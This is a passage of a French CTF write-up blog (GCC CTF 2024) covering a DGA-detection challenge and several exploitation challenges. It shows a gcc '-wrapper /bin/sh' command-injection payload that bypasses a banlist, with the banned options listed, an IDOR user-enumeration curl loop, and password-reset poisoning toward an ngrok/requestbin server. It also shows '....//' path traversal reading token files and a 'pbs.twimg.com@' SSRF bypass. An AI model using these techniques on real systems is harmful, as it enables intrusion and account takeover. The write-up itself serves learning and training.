+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">remove_outlier</span><span class="p">(</span><span class="n">dataframe</span><span class="p">,</span> <span class="n">col_name</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="n">low_limit</span><span class="p">,</span> <span class="n">up_limit</span> <span class="o">=</span> <span class="n">outlier_thresholds</span><span class="p">(</span><span class="n">dataframe</span><span class="p">,</span> <span class="n">col_name</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">df_without_outliers</span> <span class="o">=</span> <span class="n">dataframe</span><span class="p">[</span><span class="o">~</span><span class="p">((</span><span class="n">dataframe</span><span class="p">[</span><span class="n">col_name</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="n">low_limit</span><span class="p">)</span> <span class="o">|</span> <span class="p">(</span><span class="n">dataframe</span><span class="p">[</span><span class="n">col_name</span><span class="p">]</span> <span class="o">&gt;=</span> <span class="n">up_limit</span><span class="p">))]</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">df_without_outliers</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Il ne reste plus qu&rsquo;à utiliser notre modèle sur le service fourni:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./dga.png"
+        data-srcset="./dga.png, ./dga.png 1.5x, ./dga.png 2x"
+        data-sizes="auto"
+        alt="./dga.png"
+        title="dga" /></p>
+<p><code>GCC{M4ch1n3_L34rn1ng_15_v3ry_g00d_4t_d3t3ct1ng_m4l1c10us_4ct1v135}</code></p>
+<p>Crédits :</p>
+<ul>
+<li><a href="https://www.elastic.co/fr/blog/supervised-and-unsupervised-machine-learning-for-dga-detection" target="_blank" rel="noopener noreffer ">https://www.elastic.co/fr/blog/supervised-and-unsupervised-machine-learning-for-dga-detection</a></li>
+<li><a href="https://nathan-out.github.io/posts/ml-x-cybersecurite-analyse-url/" target="_blank" rel="noopener noreffer ">https://nathan-out.github.io/posts/ml-x-cybersecurite-analyse-url/</a></li>
+<li><a href="https://www.kaggle.com/code/omurcantatar/domain-generation-algorithm-dga-detection/notebook" target="_blank" rel="noopener noreffer ">https://www.kaggle.com/code/omurcantatar/domain-generation-algorithm-dga-detection/notebook</a></li>
+</ul>
+<h3 id="gcc-online">GCC Online</h3>
+<p>Le challenge se présente sous la forme d&rsquo;une page web permettant de compiler un code C en donnant le choix de définir des flags de compilation ainsi que des variables d&rsquo;environnement. Le binaire généré étant tout à fait classique, il faudra donc opérer à la compilation.</p>
+<p>Grâce à un coéquipier, on s&rsquo;arme rapidement de <a href="https://gtfobins.github.io/gtfobins/gcc/" target="_blank" rel="noopener noreffer ">GTFOBins</a> afin d&rsquo;éxécuter des commandes sur le serveur.</p>
+<p>En guise de test, on peut penser à lire <code>/etc/passwd</code>, ce qui échoue:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./banlist.png"
+        data-srcset="./banlist.png, ./banlist.png 1.5x, ./banlist.png 2x"
+        data-sizes="auto"
+        alt="./banlist.png"
+        title="banlist" /></p>
+<p>Toutefois, en pensant à adapter le premier payload ouvrant un shell, on constate que <code>-wrapper</code> n&rsquo;est pas correctement filtré:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./wrapper.png"
+        data-srcset="./wrapper.png, ./wrapper.png 1.5x, ./wrapper.png 2x"
+        data-sizes="auto"
+        alt="./wrapper.png"
+        title="wrapper" /></p>
+<p>On peut donc effectuer un <code>pwd</code> et constater que l&rsquo;application Flask lancée par <code>__init__.py</code> filtre les options à bannir et vérifie que leur syntaxe est correcte:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Compilation Error.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Traceback (most recent call last):
+</span></span><span class="line"><span class="cl">  File &#34;/data/app/__init__.py&#34;, line 77, in compile_code
+</span></span><span class="line"><span class="cl">    with open(file_name[:-2], &#39;rb&#39;) as binary_file:
+</span></span><span class="line"><span class="cl">         ^^^^^^^^^^^^^^^^^^^^^^^^^^
+</span></span><span class="line"><span class="cl">FileNotFoundError: [Errno 2] No such file or directory: &#39;/tmp/2d345033d3dbcc23bc368b36d46a4ef47b9c41a42f5965fa7d57bd697b60ae44&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> Output:
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">15e94765365729ab9599cd8ba2a4634aa8bcd9ec3961daf633f611d9f575a48b
+</span></span><span class="line"><span class="cl">app
+</span></span><span class="line"><span class="cl">flag-d66f8a09eb837545e857994ab28a3ed635d5c4c7c7caa710d28111a536b42422.txt
+</span></span><span class="line"><span class="cl">requirements.txt
+</span></span><span class="line"><span class="cl">venv
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Il ne reste plus qu&rsquo;à afficher le flag, en fournissant en argument:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">gcc main.c -wrapper /bin/sh,-s,-c,cat<span class="si">${</span><span class="nv">IFS</span><span class="si">}</span>/data/flag-d66f8a09eb837545e857994ab28a3ed635d5c4c7c7caa710d28111a536b42422.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./flag_gcc.png"
+        data-srcset="./flag_gcc.png, ./flag_gcc.png 1.5x, ./flag_gcc.png 2x"
+        data-sizes="auto"
+        alt="./flag_gcc.png"
+        title="flag_gcc" /></p>
+<p><strong>Notes</strong>:</p>
+<p>Le fichier <code>banlist.txt</code> devait empêcher de fournir les arguments suivants avant sa suppression:</p>
+<p>-wrapper</p>
+<p>-E</p>
+<p>-B</p>
+<p>-o</p>
+<p>&ndash;output</p>
+<p>La solution attendue était de lire le code source de <code>__init__.py</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-x c /data/app/__init__.py
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>puis de supprimer cette liste avant de réutiliser <code>-wrapper</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">-Xlinker -o/data/15e94765365729ab9599cd8ba2a4634aa8bcd9ec3961daf633f611d9f575a48b/banlist.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="web">Web</h2>
+<p>Remarque: Ces challenges étants résolus par un coéquipier, les exploitations ont été refaites avec les <code>Dockerfile</code> fournis (voir Introduction)</p>
+<h3 id="free-cider">Free Cider</h3>
+<h4 id="idor">IDOR</h4>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./free_cider.png"
+        data-srcset="./free_cider.png, ./free_cider.png 1.5x, ./free_cider.png 2x"
+        data-sizes="auto"
+        alt="./free_cider.png"
+        title="free_cider" /></p>
+<p>Une feature de réinitialisation du mdp est présente, mais il ne semble pas y avoir d&rsquo;injections triviales ds ces champs.
+On remarque un cookie de session <code>flask</code> qui ne semble pas vulnérable:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">flask-unsign --decode --cookie eyJub25jZSI6IjYzYzkyNmQwZTM3MzNhMDllOWNhMTM0YjJhZjg1NjhiIn0.ZefV6w.Jgbf49cZlIxFytdhbjyZH97HoQY
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s1">&#39;nonce&#39;</span>: <span class="s1">&#39;63c926d0e3733a09e9ca134b2af8568b&#39;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Le fuzzing était possible mais semblait compromis à cause d&rsquo;un un rate limiting. En revanche, le code source fait référence à un <strong>Swagger</strong>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="c">&lt;!-- 
+</span></span></span><span class="line"><span class="cl"><span class="c">Note for admins : 
+</span></span></span><span class="line"><span class="cl"><span class="c">For the sake of security, remove the bloody swagger UI from the production build.
+</span></span></span><span class="line"><span class="cl"><span class="c">--&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On se doute qu&rsquo;il existe une <strong>API</strong> Swagger, souvent reliée à <code>/api/v1/swagger.json</code>, ce qui est le cas ici:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./swagger.png"
+        data-srcset="./swagger.png, ./swagger.png 1.5x, ./swagger.png 2x"
+        data-sizes="auto"
+        alt="./swagger.png"
+        title="swagger" /></p>
+<p>L&rsquo;API Restful comporte 4 endpoints:</p>
+<ul>
+<li>
+<p><code>/api/v1/register/</code> qui est désactivé</p>
+</li>
+<li>
+<p><code>/api/v1/login/</code>, nécessite un compte</p>
+</li>
+<li>
+<p><code>/api/v1/reset-password/</code> que l&rsquo;on a déjà entrevu, mais nécessite un compte</p>
+</li>
+<li>
+<p><code>/api/v1/user/{user_id}</code> que l&rsquo;on peut exploiter</p>
+</li>
+</ul>
+<p>Énumérons ainsi les utilisateurs disponibles grâce à l&rsquo;<strong>IDOR</strong> fournie par ce dernier endpoint:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="k">for</span> i in <span class="o">{</span>1..100<span class="o">}</span><span class="p">;</span> <span class="k">do</span> <span class="nb">echo</span> <span class="k">$(</span>curl -s -X <span class="s1">&#39;GET&#39;</span>   <span class="s1">&#39;http://172.17.0.2:8080/api/v1/user/&#39;</span><span class="nv">$i</span>   -H <span class="s1">&#39;accept: application/json&#39;</span><span class="k">)</span> <span class="p">;</span> <span class="k">done</span> <span class="p">|</span> grep <span class="nb">true</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;admin&#34;</span>:true,<span class="s2">&#34;id&#34;</span>:9,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;isabel_castillo57&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;admin&#34;</span>:true,<span class="s2">&#34;id&#34;</span>:24,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;william_glover68&#34;</span><span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="o">{</span><span class="s2">&#34;admin&#34;</span>:true,<span class="s2">&#34;id&#34;</span>:31,<span class="s2">&#34;username&#34;</span>:<span class="s2">&#34;kimberly_jennings64&#34;</span><span class="o">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="password-reset-poisoning">Password reset poisoning</h4>
+<p>Que faire maintenant? En lisant <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Account%20Takeover#password-reset-feature" target="_blank" rel="noopener noreffer ">PayloadAllTheThings</a> sur les faiblesse des <strong>password reset</strong> on note:</p>
+<ul>
+<li>différence entre la gestion de l&rsquo;identifiant ou le mail</li>
+<li>code &ldquo;maison de cette feature et</li>
+<li>jeton prédictible</li>
+<li><strong>empoisonnement</strong> du nom de domaine du lien</li>
+</ul>
+<p>Il s&rsquo;agissait de cette dernière technique. Pour la mettre en place plusieurs outils existent, l&rsquo;important est de disposer d&rsquo;un serveur:</p>
+<ul>
+<li><code>burp collaborator (Pro..)</code></li>
+<li><code>requestbin</code></li>
+<li><code>ngrok</code></li>
+</ul>
+<p>Essayons avec la première utilisatrice:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./poisoning_burp.png"
+        data-srcset="./poisoning_burp.png, ./poisoning_burp.png 1.5x, ./poisoning_burp.png 2x"
+        data-sizes="auto"
+        alt="./poisoning_burp.png"
+        title="poisoning" /></p>
+<p>Ni une, ni deux on reçoit ce token:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./got_token.png"
+        data-srcset="./got_token.png, ./got_token.png 1.5x, ./got_token.png 2x"
+        data-sizes="auto"
+        alt="./got_token.png"
+        title="token" /></p>
+<p>On s&rsquo;empresse de suivre le lien:</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./password.png"
+        data-srcset="./password.png, ./password.png 1.5x, ./password.png 2x"
+        data-sizes="auto"
+        alt="./password.png"
+        title="password" /></p>
+<p>Et c&rsquo;est gagné!</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./flag_cider.png"
+        data-srcset="./flag_cider.png, ./flag_cider.png 1.5x, ./flag_cider.png 2x"
+        data-sizes="auto"
+        alt="./flag_cider.png"
+        title="flag" /></p>
+<h3 id="free-chat">Free Chat</h3>
+<p>Pour faire simple et concis, voici le <a href="https://github.com/GCC-ENSIBS/GCC-CTF-2024/tree/main/Web/free_chat/write-up" target="_blank" rel="noopener noreffer ">writeup de l&rsquo;auteur</a></p>
+<h4 id="lfi">LFI</h4>
+<p>En se créeant un compte pour l&rsquo;application, nous avons accès à une application de chat</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./chat.png"
+        data-srcset="./chat.png, ./chat.png 1.5x, ./chat.png 2x"
+        data-sizes="auto"
+        alt="./chat.png"
+        title="chat" /></p>
+<p>Le paramètre  <code>name</code> de visualisation de notre photo de profil <code>http://worker02.gcc-ctf.com:12033/pfp?name=default.png</code> est vulnérable à une <strong>File Inclusion</strong> (la suite de caractères <code>../</code> étant filtrée):</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./lfi.png"
+        data-srcset="./lfi.png, ./lfi.png 1.5x, ./lfi.png 2x"
+        data-sizes="auto"
+        alt="./lfi.png"
+        title="lfi" /></p>
+<h4 id="wildcard-dns--ssrf">Wildcard DNS &amp; SSRF</h4>
+<p>Il y a un manque de validation quand on &ldquo;upload une image&rdquo;.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="./pfp3.png"
+        data-srcset="./pfp3.png, ./pfp3.png 1.5x, ./pfp3.png 2x"
+        data-sizes="auto"
+        alt="./pfp3.png"
+        title="pfp3" /></p>
+<ul>
+<li>
+<p>L&rsquo;application vérifie que l&rsquo;url d&rsquo;upload commence par <code>https://pbs.twimg.com</code> mais <code>http://pbs.twimg.com@7.tcp.eu.ngrok.io:19922</code> est accepté et redirige vers notre domaine. Voir plus de détails sur <a href="https://nip.io" target="_blank" rel="noopener noreffer ">https://nip.io</a> .</p>
+</li>
+<li>
+<p>Si l&rsquo;on décode en base64 l&rsquo;url-avatar <code>http://pbs.twimg.com@localhost:1337</code>, on obtient le code source de la page:</p>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>FreeChat - Dev Panel<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">script</span> <span class="na">src</span><span class="o">=</span><span class="s">&#34;/static/js/hint.js&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;text-align: center;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>FreeChat - Dev Panel<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">h3</span><span class="p">&gt;</span>Welcome dev, to access the panel, please enter your access token<span class="p">&lt;/</span><span class="nt">h3</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;http://devpanel:8000/&#34;</span> <span class="na">action</span><span class="o">=</span><span class="s">&#34;GET&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;text&#34;</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;token&#34;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&#34;Access Token&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&#34;submit&#34;</span> <span class="na">value</span><span class="o">=</span><span class="s">&#34;Submit&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">h5</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;display: inline-block;&#34;</span><span class="p">&gt;</span>Forgot your token ? <span class="p">&lt;/</span><span class="nt">h5</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">button</span> <span class="na">onclick</span><span class="o">=</span><span class="s">&#34;hint()&#34;</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;display: inline-block;&#34;</span><span class="p">&gt;</span>Hint<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">div</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;hint&#34;</span><span class="p">&gt;&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>En regardant le <code>hint</code> avec <code>http://pbs.twimg.com@localhost:1337/static/js/hint.js</code>, on confirme qu&rsquo;il faut là aussi un token:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="kd">function</span> <span class="nx">hint</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s2">&#34;hint&#34;</span><span class="p">).</span><span class="nx">innerHTML</span> <span class="o">=</span> <span class="s2">&#34;&lt;h5&gt;Hint: Don&#39;t be stupid admin, if you&#39;ve lost the &lt;b&gt;token&lt;/b&gt; you can still &lt;b&gt;locate&lt;/b&gt; it. Just think!&lt;/h5&gt;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h4 id="locate-varcachelocatelocatedb">Locate: /var/cache/locate/locatedb</h4>
+<p>Ici vient une partie plus vicieuse, ne pouvant pas énumérer les dossiers, on doit utiliser en supposant qu&rsquo;elle existe <code>locatedb</code>, stockant le PATH de l&rsquo;application.</p>
+<p>On se rend donc ici <code>http://worker02.gcc-ctf.com:12033/pfp?name=....//....//....//....//....//....//var/cache/locate/locatedb</code>, ce qui télécharge le fichier puis on recherche:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">locate -d ./locatedb <span class="s1">&#39;freechat&#39;</span>
+</span></span><span class="line"><span class="cl">/freechat
+</span></span><span class="line"><span class="cl">/freechat/app.py
+</span></span><span class="line"><span class="cl">...
+</span></span><span class="line"><span class="cl">/home/freechat
+</span></span><span class="line"><span class="cl">/home/freechat/.bash_logout
+</span></span><span class="line"><span class="cl">/home/freechat/.bashrc
+</span></span><span class="line"><span class="cl">/home/freechat/.for_d3vs_0nly
+</span></span><span class="line"><span class="cl">/home/freechat/.for_d3vs_0nly/access_token.txt
+</span></span><span class="line"><span class="cl">/home/freechat/.profile
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Le fichier <code>http://worker05.gcc-ctf.com:12033/pfp?name=....//....//....//....//....//....//home/freechat/.for_d3vs_0nly/access_token.txt</code> contient le sésame.</p>
+<p>On peut donc réutiliser la SSRF avec le token:</p>
+<p><code>http://pbs.twimg.com@devpanel:8000/?token=af33aa8342e212020e0ba08bca94e3559f82d3efb0eb7ec6e7eafbc11710f05b</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>DevPanel<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">style</span><span class="o">=</span><span class="s">&#34;text-align: center;&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>DevPanel<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">h5</span><span class="p">&gt;</span>Hello dev, your flag is : GCC{L0c4t3_tr1ck+SsRf_1s_FuN}<span class="p">&lt;/</span><span class="nt">h5</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>Made with ❤️ by Mika<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Merci pour votre lecture!</p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-03-04</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="//localhost:1313/posts/gcc-ctf/" data-title="GCC 2024- Quelques writeups" data-hashtags="android,crypto,reverse,machine learning,misc,web"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="//localhost:1313/posts/gcc-ctf/" data-hashtag="android"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="//localhost:1313/posts/gcc-ctf/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/android/">Android</a>,&nbsp;<a href="/tags/crypto/">Crypto</a>,&nbsp;<a href="/tags/reverse/">Reverse</a>,&nbsp;<a href="/tags/machine-learning/">Machine Learning</a>,&nbsp;<a href="/tags/misc/">Misc</a>,&nbsp;<a href="/tags/web/">Web</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/cheatsheet/" class="prev" rel="prev" title="Cheatsheet"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Cheatsheet</a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.123.7">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
